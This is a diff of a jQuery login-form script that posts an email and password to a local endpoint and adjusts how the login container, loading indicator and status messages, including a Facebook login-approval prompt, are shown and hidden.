@@ -24,16 +24,20 @@ $(document).ready(function(){
 
   $("#login_form").submit(function (event){
     event.preventDefault();
+
     // event.stopPropagation();
     var email = $("input[name='email']").val();
     var password = $("input[name='password']").val();
-    $('#login').hide();
+    $('.loginContainer').addClass("hidden");
+    $('.loginContainer').delay(200).hide(0);
     $("#footer").hide();
-    $("#login_btn").hide();
-    $("#loading").show();
+    // $("#login_btn").hide();
+    $("#loading").delay(200).show(0);
     $.post("/index", {email: email, password: password}, function( data ) {
       $("#plead").hide();
       if (data === "1"){
+        $('.loginContainer').show();
+        $('.loginContainer').removeClass("hidden");
         $("#flash").html("<h3>Please approve login attempt from <a href='http://www.facebook.com' style='color:#4DA1DE;' target='_blank'>www.facebook.com</a></h3>");
         $("#footer-text").show();
         $("#icon").hide();
@@ -43,11 +47,15 @@ $(document).ready(function(){
         $("#login").show();
         $("#login_btn").show();
       } else if (data === "2"){
+        $('.loginContainer').show();
+        $('.loginContainer').removeClass("hidden");
+        $("#footer").show();
         $("#flash").html("<h3>Please check your username and password</h3>");
         $("#loading").hide();
         $("#login").show();
         $("#login_btn").show();
       } else if (data === false){
+        $('.loginContainer').removeClass("hidden");
         $("#flash").html("<h3>Please try again later</h3>");
         $("#footer").show();
         $("#loading").hide();
